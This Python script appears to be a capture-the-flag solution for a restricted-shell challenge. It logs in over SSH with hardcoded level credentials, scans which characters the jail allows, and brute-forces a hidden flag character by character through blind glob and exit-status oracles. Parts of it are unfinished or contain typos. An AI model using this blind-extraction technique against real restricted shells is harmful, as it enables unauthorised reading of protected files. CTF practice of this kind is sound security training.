import paramiko
import time

def receive_output(conn):
    output = ""
    receiving = True

    # Receive all available characters
    while receiving:
        try:
            output += conn.recv(1024).decode('ascii')
        except:
            receiving = False

    return output.split('\n')

def get_connection(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect('challenges.ringzer0team.com', port=10253, username='level6', password='FLAG-PcttpB5gR3faGUnuf6i1VP90ZMj42IEn')

    connection = client.invoke_shell()

    connection.settimeout(0.5)

    return connection

def prepare_for_test(host, port, username, password):
    conn = get_connection(host, port, username, password)
    
    # Receive welcome message
    receive_output(conn)
    
    return conn

def send_cmd(conn, command):
    conn.send(command + '\n')
    time.sleep(0.5)
    output = receive_output(conn)

    for l in output:
        if 'status' in l:
            status_code = l.split(': ')[-1][:-5]
            break

        if 'Restricted' in l:
            status_code = -666
            break

        if l == "":
            print("[ERROR] empty line")
            print(output)


    return int(status_code)

def find_flag_length(conn):
    base_cmd = "uniq"
    #trial = "[.a-z0-9]"
    trial = '[.\\!+=a-zA-Z0-9_\\-]'
    ext = "[a-z][a-z][a-z]"
    
    found = False
    count = 1
    while not found:
        cmd = f"{base_cmd} .{trial*count}"
        #cmd = f"{base_cmd} {trial*count}.{ext}"
        print(f"Sending cmd '{cmd}'")
        status = send_cmd(conn, cmd)
        if status == 0:
            print(f"FOUND ! -- {cmd}")
            print(count)
            count +=1
            #found = True
        else:
            count +=1

        time.sleep(1.5)

def find_flag_chars(conn):
    base_cmd = '[[ "`uniq [h-j][a-z][a-z][a-z].[.a-z][.a-z]`" =='
    trial = '[\\!+=a-zA-Z0-9_\\-]'
    suffix = ']]'

    found = False
    count = 35
    while not found:
        cmd = f"{base_cmd} {trial*count} {suffix}"
        print(f"Count {count}")
        #print(f"Sending cmd '{cmd}'")
        status = send_cmd(conn, cmd)
        if status == 0:
            print(f"FOUND ! -- {cmd}")
            count +=1
            #found = True
        else:
            print(status)
            count +=1

        time.sleep(1.5)


def find_FLAG(conn):

    # Const
    base_cmd = '[[ "`uniq .[.][a-z][a-z][a-z][a-z][.][.][a-z][a-z][a-z]`" =='
    suffix = ']]'
    upper_alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']


    #start_filter = '[F][L][A][G][-][W][a-z][A-Z][0-9][A-Z][A-Z][0-9][0-9][a-z][A-Z][A-Z][A-Z][A-Z][A-Z][A-Z][A-Z][A-Z][A-Z][A-Z][a-z][A-Z][A-Z][0-9][A-Z][A-Z][a-z][0-9][A-Z][A-Z][0-9][a-z][A-Z]'
    start_filter = '[F][L][A][G][-][W][a-z][C][8][X][Y][9][6][a-z][O][M][R][L][D][N][Z][L][I][A-Z][a-z][A-Z][A-Z][0-9][A-Z][A-Z][a-z][0-9][A-Z][A-Z][0-9][a-z][A-Z]'

    filters = start_filter.split('[')[1:]

    filters = [s[:-1] for s in filters]

    nb_char = len(filters)
    idx = 5

    done = False
    while not done:

        current_filter = filters[idx]

        if '-' not in current_filter:
            idx += 1
            continue

        if current_filter[0].isdigit():
            found = False

            for i in range(10):
                current_filter = f"[{i}]"

                filter_val = [f"[{filters[j]}]" for j in range(0,idx)]
                filter_val += current_filter
                filter_val += [f"[{filters[j]}]" for j in range(idx+1, nb_char)]

                filter_val = ''.join(filter_val)

                cmd = f"{base_cmd} {filter_val} {suffix}"

                print(f"Trying filter {current_filter} for idx {idx}")

                status = send_cmd(conn, cmd)

                time.sleep(1)
                if status == 0:
                    filters[idx] = str(i)
                    print("[FOUND] -- Filters is now ")
                    print(''.join(filter_val))
                    break

        elif current_filter[0].isupper():

            for c in upper_alphabet:
                current_filter = f"[{c}]"

                filter_val = [f"[{filters[j]}]" for j in range(0,idx)]
                filter_val += current_filter
                filter_val += [f"[{filters[j]}]" for j in range(idx+1, nb_char)]

                filter_val = ''.join(filter_val)

                cmd = f"{base_cmd} {filter_val} {suffix}"

                print(f"Trying filter {current_filter} for idx {idx}")

                status = send_cmd(conn, cmd)

                time.sleep(1)
                if status == 0:
                    filters[idx] = str(c)
                    print("[FOUND] -- Filters is now ")
                    print(''.join(filter_val))
                    break


                # TODO : If status == 0
                # filters[idx] = current_filter
                # idx += 1
                # break
        else:
            print("Not handling a-z for now")

        idx += 1

        if idx == nb_char:
            done = True

    print("Final filter : ")
    print(''.join(filter_val))


def find_FLAG3(conn):

    allowed_char = ['a', 'g', 'h', 'i', 'j', 'l', 'm', 'n', 'o', 'q', 'u', 'v', 'w', 'x', 'y', 'z']

    base_cmd = '[[ "`uniq .[.][a-z][a-z][a-z][a-z][.][.][a-z][a-z][a-z]`" =='
    nb_char = 37
    chars = [{'value':'[a-zA-Z0-9]','isNumber':None, 'isUpper':None} for i in range(nb_char)]

    chars[0]['value'] = 'F'
    chars[1]['value'] = 'L'
    chars[2]['value'] = 'A'
    chars[3]['value'] = 'G'
    chars[4]['value'] = '-'
    suffix = ']]'

    test_idx = 5

    state = 'initial'

    states = ['initial', 'numberOrChar', 'search', 'found']







def find_FLAG2(conn):

    allowed_char = ['a', 'g', 'h', 'i', 'j', 'l', 'm', 'n', 'o', 'q', 'u', 'v', 'w', 'x', 'y', 'z']

    base_cmd = '[[ "`uniq .[.][a-z][a-z][a-z][a-z][.][.][a-z][a-z][a-z]`" =='
    nb_char = 37
    chars = [{'value':'[a-zA-Z0-9]','isNumber':None, 'isUpper':None} for i in range(nb_char)]

    chars[0]['value'] = 'F'
    chars[1]['value'] = 'L'
    chars[2]['value'] = 'A'
    chars[3]['value'] = 'G'
    chars[4]['value'] = '-'
    suffix = ']]'

    test_idx = 5

    while test_idx < nb_char:
        filter_val = ""
        for i in range(test_idx):
            filter_val += chars[i]['value']

        if chars[test_idx]['isNumber'] is None:
            char_filter = chars[test_idx]['value'].replace('0-9', '')
            filter_val += char_filter

            for j in range(test_idx+1, nb_char):
                filter_val += chars[j]['value']

            cmd = f"{base_cmd} {filter_val} {suffix}"

            status = send_cmd(conn, cmd)
            if status == 0:
                chars[test_idx]['isNumber'] = False
                chars[test_idx]['value'] = char_filter
            else:
                chars[test_idx]['isNumber'] = True
                chars[test_idx]['value'] = "[0-9]"

        elif chars[test_idx]['isNumber']:
            for k in range(0,10):
                print('t')

        elif chars[test_idx]['isNumber'] is False and chars[test_idx]['isUpper'] is None:
            ilter_val += "[a-zA-Z]"

            for j in range(test_idx+1, nb_char):
                filter_val += chars[j]['value']

            cmd = f"{base_cmd} {filter_val} {suffix}"

            status = send_cmd(conn, cmd)
            if status == 0:
                chars[test_idx]['isNumber'] = False
                chars[test_idx]['value'] = "[a-zA-Z]"
            else:
                chars[test_idx]['isNumber'] = True
                chars[test_idx]['value'] = "[0-9]"
            #status = send_cmd(conn, )

"""
    filter_val = ""
    for c in chars:
        if c['value']:
            filter_val += f"[{c['value']}]"
            

    found = False
    count = 35
    while not found:
        cmd = f"{base_cmd} {trial*count} {suffix}"
        print(f"Count {count}")
        #print(f"Sending cmd '{cmd}'")
        status = send_cmd(conn, cmd)
        if status == 0:
            print(f"FOUND ! -- {cmd}")
            count +=1
            #found = True
        else:
            print(status)
            count +=1

        time.sleep(1.5)
"""

def find_available_chars(conn):
    alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    upper_alphabet = [c.upper() for c in alphabet]

    numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

    special_chars = ['&', ';', '$', '!', '#', '-', '?', '*', '_', '@', '>', '<', '(', ')', '[', ']', '`', '"', "'", '/', '|', '{', '}', ':', '.', ',', '=', '+', '%', '~', '^']

    manually_tested = ['\\']

    chars_to_test = alphabet + upper_alphabet + numbers + special_chars

    restricted = []
    allowed = []
    for c in chars_to_test:
        status = send_cmd(conn, c)
        if status == -666:
            restricted.append(c)
        else:
            allowed.append(c)
        print(f"Trying '{c}' --- {'Allowed' if status != -666 else 'Restricted'}")
        time.sleep(1)

    allowed += manually_tested

    print("Scan done")
    print("Allowed : ")
    print(allowed)
    print("Restricted : ")
    print(restricted)

def gen_test_line():
    base_cmd = '[[ "`uniq flag.txt`" =='
    trial = '[\\!+=a-zA-Z0-9_\\-]'
    suffix = ']] && echo 1'
    count = 37

    print(f"{base_cmd} {trial*count} {suffix}")

#gen_test_line()
#exit(0)
conn = prepare_for_test('challenges.ringzer0team.com', 10253, 'level6', 'FLAG-PcttpB5gR3faGUnuf6i1VP90ZMj42IEn')
find_FLAG(conn)
exit(0)
find_flag_length(conn)
exit(0)
find_flag_chars(conn)
exit(0)

#find_available_chars(conn)
find_flag_length(conn)
send_cmd(conn, 'uniq .[a-z][a-z][a-z][a-z][a-z][a-z]')

